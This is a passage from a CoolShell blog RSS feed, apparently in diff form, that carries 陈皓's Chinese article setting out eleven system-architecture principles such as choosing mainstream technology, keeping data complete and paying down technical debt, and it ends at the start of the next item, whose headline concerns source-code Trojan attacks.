+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/19395.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/05/Authorization-360x200-1-150x150.png" alt="HTTP API 认证授权术" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19395.html" class="wp_rp_title">HTTP API 认证授权术</a></li><li ><a href="https://coolshell.cn/articles/21003.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/06/time-bomb-150x150.png" alt="计时攻击 Timing Attacks" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21003.html" class="wp_rp_title">计时攻击 Timing Attacks</a></li><li ><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/10/HTTP-770x513-300x200-1-150x150.jpg" alt="HTTP的前世今生" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_title">HTTP的前世今生</a></li><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/17607.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/MongoDB-150x150.jpg" alt="从 MongoDB “赎金事件” 看安全问题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17607.html" class="wp_rp_title">从 MongoDB “赎金事件” 看安全问题</a></li><li ><a href="https://coolshell.cn/articles/17066.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2015/04/phishing-1-150x150.jpg" alt="关于移动端的钓鱼式攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17066.html" class="wp_rp_title">关于移动端的钓鱼式攻击</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/21708.html">网络数字身份认证术</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/21708.html/feed</wfw:commentRss>
+			<slash:comments>14</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>我做系统架构的一些原则</title>
+		<link>https://coolshell.cn/articles/21672.html</link>
+					<comments>https://coolshell.cn/articles/21672.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 21 Dec 2021 07:46:41 +0000</pubDate>
+				<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[系统架构]]></category>
+		<category><![CDATA[Architecture]]></category>
+		<category><![CDATA[Design]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=21672</guid>
+
+					<description><![CDATA[<p>工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/21672.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/21672.html">我做系统架构的一些原则</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-full wp-image-21682" src="https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x.png" alt="" width="250" height="250" srcset="https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x.png 250w, https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x-150x150.png 150w" sizes="(max-width: 250px) 100vw, 250px" />工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）</p>
+<h4>原则一：关注于真正的收益而不是技术本身</h4>
+<p>对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：</p>
+<ul>
+<li><strong>是否可以降低技术门槛加快整个团队的开发流程</strong>。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）</li>
+<li><strong>是否可以让整个系统可以运行的更稳定</strong>。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《<a title="关于高可用的系统" href="https://coolshell.cn/articles/17459.html" target="_blank" rel="noopener">关于高可用的架构</a>》）</li>
+<li><strong>是否可以通过简化和自动化降低成本</strong>。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。</li>
+</ul>
+<p>如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。</p>
+<p><span id="more-21672"></span></p>
+<h4>原则二：以应用服务和 API 为视角，而不是以资源和技术为视角</h4>
+<p>国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……</p>
+<p><strong>这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops</strong>。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是——<strong>要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。</strong></p>
+<h4>原则三：选择最主流和成熟的技术</h4>
+<p>技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的  PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。</p>
+<ul>
+<li><strong>尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈</strong>。 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。</li>
+<li><strong>选择全球流行的技术，而不是中国流行的技术</strong>。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。</li>
+<li><strong>尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改</strong>。我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。</li>
+<li><strong>绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的</strong>。一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的</li>
+</ul>
+<p>在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……</p>
+<p>注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……</p>
+<h4>原则四：完备性会比性能更重要</h4>
+<p>我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。</p>
+<p>所以，我给如下的一些如下的架构原则：</p>
+<ul>
+<li><strong>使用最科学严谨的技术模型为主，并以不严谨的模型作为补充</strong>。对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。</li>
+<li><strong>性能上的东西，总是有很多解的</strong>。我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。</li>
+</ul>
+<p>为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。</p>
+<h4>原则五：制定并遵循服从标准、规范和最佳实践</h4>
+<p>这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。<strong>有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？</strong></p>
+<p>还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。</p>
+<p>下面，我罗列一些你需要注意的标准和规范（包括但不限于）：</p>
+<ul>
+<li><strong>服务间调用的协议标准和规范</strong>。这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。</li>
+<li><strong>一些命名的标准和规范</strong>。这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等</li>
+<li><strong>日志和监控的规范</strong>。这其中包括：日志格式，监控数据，采样要求，报警……等等</li>
+<li><strong>配置上的规范</strong>。这其中包括：操作系统配置、中间件配置，软件包……等等</li>
+<li><strong>中间件使用的规范</strong>。数据库，缓存、消息队列……等等</li>
+<li><strong>软件和开发库版本统一</strong>。整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。</li>
+</ul>
+<p>这里重要说一下两个事：</p>
+<ul>
+<li><strong>Restful API 的规范</strong>。我觉得是非常重要的，这里给两个我觉得写得最好的参考：<a href="https://github.com/paypal/api-standards/blob/master/api-style-guide.md" target="_blank" rel="noopener">Paypal</a> 和 <a href="https://github.com/microsoft/api-guidelines" target="_blank" rel="noopener">Microsoft</a> 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。</li>
+<li><strong>另一个是服务调用链追踪</strong>。对于服务调用链追踪来说，基本上都是参考于 <a href="https://research.google/pubs/pub36356/" target="_blank" rel="noopener">Google Dapper</a> 这篇论文，目前有很多的实现，最严格的实现是 <a href="https://zipkin.io/" target="_blank" rel="noopener">Zipkin</a>，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。</li>
+<li><strong>软件升级</strong>。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。</li>
+</ul>
+<h4>原则六：重视架构扩展性和可运维性</h4>
+<p>在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。</p>
+<ul>
+<li><strong>通过服务编排架构来降低服务间的耦合</strong>。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。</li>
+<li><strong>通过服务发现或服务网关来降低服务依赖所带来的运维复杂度</strong>。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。</li>
+<li><strong>一定要使用各种软件设计的原则</strong>。比如：像SOLID这样的原则（参看《<a title="一些软件设计的原则" href="https://coolshell.cn/articles/4535.html">一些软件设计的原则</a>》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《<a title="SteveY对Amazon和Google平台的吐槽 - 67,710 人阅读" href="https://coolshell.cn/articles/5701.html" target="_blank" rel="noopener">SteveY对Amazon和Google平台的吐槽</a>》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《<a title="分布式系统的事务处理" href="https://coolshell.cn/articles/10910.html" target="_blank" rel="noopener">分布式系统的事务处理</a>》，或微软件的 《<a href="https://docs.microsoft.com/en-us/azure/architecture/patterns/" target="_blank" rel="noopener">Cloud Design Patterns</a>》）……等等</li>
+</ul>
+<h4>原则七：对控制逻辑进行全面收口</h4>
+<p>所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：</p>
+<ul>
+<li><strong>流量收口</strong>。包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。</li>
+<li><strong>服务治理收口</strong>。包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK &#8211; 如：Spring Cloud，或服务网格Service Mesh等技术。</li>
+<li><strong>监控数据收口</strong>。包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。</li>
+<li><strong>资源调度有应用部署的收口</strong>。包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。</li>
+<li><strong>中间件的收口</strong>。包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。</li>
+</ul>
+<p>对此，这里的原则是：</p>
+<ul>
+<li><strong>你要选择容易进行业务逻辑和控制逻辑分离的技术</strong>。这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。</li>
+<li><strong>你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术</strong>。如：有庞大社区而且相互兼容的技术，如：Java, Docker,  Ansible，HTTP，Telegraf/Collectd……</li>
+<li><strong>中间件你要使用可以 支持HA集群和多租户的技术</strong>。这里基本上所有的主流中间件都会支持 HA 集群方式的。</li>
+</ul>
+<h4>原则八：不要迁就老旧系统的技术债务</h4>
+<p>我发现很多公司都很非常大的技术债务，这些债务具体表现如下：</p>
+<ul>
+<li><strong>使用老旧的技术</strong>。比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等</li>
+<li><strong>不合理的设计</strong>。比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等</li>
+<li> <strong>缺少配套设施</strong>。比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等</li>
+</ul>
+<p>来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“<strong>如果你是来找我 case-by-case 解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……</strong>”，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。</p>
+<p>他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……</p>
+<p>我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《<a href="https://coolshell.cn/articles/11656.html" target="_blank" rel="noopener">开发团队的效率</a>》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）</p>
+<p>这里有几个原则和方法我是非常坚持的，分享给大家：</p>
+<ul>
+<li><strong>与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。</strong></li>
+<li><strong>建设没有技术债的“新城区”，并通过“<a href="https://docs.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer" target="_blank" rel="noopener">防腐层</a> ”的架构模型，不要让技术债侵入“新城区”</strong>。</li>
+</ul>
+<h4>原则九：不要依赖自己的经验，要依赖于数据和学习</h4>
+<p>有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade-off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……</p>
+<p>另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。</p>
+<h4>原则十：千万要小心 X &#8211; Y 问题，要追问原始需求</h4>
+<p>对于 <a title="X-Y Problem" href="https://coolshell.cn/articles/10804.html">X-Y 问题</a>，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。</p>
+<p>比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。</p>
+<p>我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……</p>
+<h4>原则十一：激进胜于保守，创新与实用并不冲突</h4>
+<p>我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《<a title="Go语言、Docker 和新技术" href="https://coolshell.cn/articles/18190.html" target="_blank" rel="noopener">Go,Docker 和新技术</a> 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。</p>
+<p>有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。</p>
+<p>这里的逻辑很简单 —— <strong>进步永远来自于探索，探索是要付出代价的，但是收益更大</strong>。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/17680.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/02/gitlab-600-150x150.jpg" alt="从Gitlab误删除数据库想到的" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17680.html" class="wp_rp_title">从Gitlab误删除数据库想到的</a></li><li ><a href="https://coolshell.cn/articles/17459.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/08/HighAvailability-BK-150x150.png" alt="关于高可用的系统" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17459.html" class="wp_rp_title">关于高可用的系统</a></li><li ><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg" alt="IoC/DIP其实是一种管理思想" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a></li><li ><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="Bret Victor &#8211; Inventing on Principle" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_title">Bret Victor &#8211; Inventing on Principle</a></li><li ><a href="https://coolshell.cn/articles/5686.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="多些时间能少写些代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5686.html" class="wp_rp_title">多些时间能少写些代码</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/21672.html">我做系统架构的一些原则</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/21672.html/feed</wfw:commentRss>
+			<slash:comments>163</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>源代码特洛伊木马攻击</title>
+		<link>https://coolshell.cn/articles/21649.html</link>
+					<comments>https://coolshell.cn/articles/21649.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 19 Nov 2021 09:02:46 +0000</pubDate>
+				<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[hacker]]></category>
+		<category><![CDATA[Unicode]]></category>
+		<category><![CDATA[木马]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=21649</guid>
+
+					<description><![CDATA[<p>最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/21649.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/21649.html">源代码特洛伊木马攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
